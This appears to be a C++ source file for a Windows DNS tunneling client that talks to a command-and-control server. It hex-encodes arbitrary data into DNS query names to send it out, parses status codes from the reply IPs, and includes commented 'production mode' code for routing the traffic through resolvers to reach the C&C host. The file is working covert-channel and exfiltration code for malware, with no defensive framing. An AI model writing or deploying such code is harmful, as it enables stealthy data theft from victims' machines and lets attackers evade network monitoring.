#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Network.h"
#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <winsock2.h>
#include <windns.h>

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib")

/**
 * Establishes connection with DNS server via DNS query
 * 
 * LOCAL TEST MODE:
 *   Sends query directly to C&C server (DNS_SERVER_IP = 127.0.0.1)
 * 
 * PRODUCTION MODE (Future):
 *   Sends query to DNS Resolver → Resolver forwards to C&C server
 * 
 * Query: a.1.1.1.domain
 * Returns: Connection ID extracted from last octet of response IP
 */
int startConnection(const char* domain) {
	if (!domain) {
		return -1;
	}

	std::string fullString = "a.1.1.1.";
	fullString += domain;
	const char* pOwnerName = fullString.c_str();
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	// ==========================================
	// LOCAL TEST MODE: Direct to C&C Server
	// ==========================================
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status = DnsQuery_A(
		pOwnerName,
		wType,
		DNS_OPTIONS,
		pSrvList,
		&pDnsRecord,
		nullptr
	);
	
	LocalFree(pSrvList);
	
	// ==========================================
	// PRODUCTION MODE (Future - commented out)
	// ==========================================
	// TODO: When using DNS Resolver:
	/*
	// Option 1: Use self-hosted DNS Resolver
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (pSrvList) {
		pSrvList->AddrCount = 1;
		pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);  // DNS Resolver IP
		
		DNS_STATUS status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
		LocalFree(pSrvList);
	}
	
	// Option 2: Use System DNS (domain must have correct NS records)
	DNS_STATUS status = DnsQuery_A(
		pOwnerName,
		wType,
		DNS_OPTIONS,
		nullptr,  // Use system DNS
		&pDnsRecord,
		nullptr
	);
	*/
	
	if (status) {
		return -1;
	}
	
	if (!pDnsRecord) {
		return -1;
	}
	
	// Parse response IP - last octet is Connection ID
	IN_ADDR ipaddr;
	ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
	std::string ipStr = inet_ntoa(ipaddr);
	DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
	
	size_t lastDot = ipStr.rfind(".");
	if (lastDot == std::string::npos) {
		return -1;
	}
	
	int connectionId = std::stoi(ipStr.substr(lastDot + 1));
	return connectionId;
}

/**
 * Send data via DNS tunneling
 * 
 * LOCAL TEST MODE:
 *   Sends directly to C&C server
 * 
 * PRODUCTION MODE (Future):
 *   Sends to DNS Resolver → Resolver forwards to C&C
 * 
 * Format: b.packetNum.connectionId.hexData.domain
 * Response IP first octet = status code
 */
int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
	if (!domain || !data) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	// ==========================================
	// LOCAL TEST MODE: Direct to C&C Server
	// ==========================================
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	// Retry up to 3 times (reduced from 5)
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
		
		// ==========================================
		// PRODUCTION MODE (Future - commented out)
		// ==========================================
		// TODO: When using DNS Resolver, replace DnsQuery_A above with:
		/*
		// Use DNS Resolver
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,  // DNS Resolver IP
			&pDnsRecord,
			nullptr
		);
		
		// Or use System DNS (if domain has NS records configured)
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			nullptr,  // System DNS
			&pDnsRecord,
			nullptr
		);
		*/
		
		if (!status && pDnsRecord) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			
			// First octet = response code
			size_t firstDot = ipStr.find(".");
			if (firstDot == std::string::npos) {
				goto cleanup;
			}
			
			int code = std::stoi(ipStr.substr(0, firstDot));
			
			switch (code) {
				case 200:  // OK - processed normally
					retCode = 0;
					goto cleanup;
					
				case 201:  // Malformed packet
					break;
					
				case 202:  // Connection non-existent - need to reconnect
					{
						int new_id = startConnection(domain);
						if (new_id != -1) {
							id = new_id;
						}
					}
					i--;  // Don't count this retry
					break;
					
				case 203:  // Out of order packets - reset
					packetNumber = 0;
					i--;  // Don't count this retry
					break;
					
				case 204:  // Max connections reached
					goto cleanup;
					
				default:   // Unknown error
					goto cleanup;
			}
		}
		
		Sleep(200);  // Reduced from 500ms to 200ms
	}
	
cleanup:
	if (pSrvList) {
		LocalFree(pSrvList);
	}
	return retCode;
}

/**
 * Convert string to hex encoding for DNS tunneling
 * Example: "Hello" -> "48656c6c6f"
 */
std::string convertToHex(const char* string) {
	if (!string) {
		return "";
	}

	std::ostringstream out;
	out << std::hex << std::setfill('0');
	
	for (const char* i = string; *i; i++) {
		out << std::setw(2) << static_cast<unsigned>(static_cast<unsigned char>(*i));
	}
	
	return out.str();
}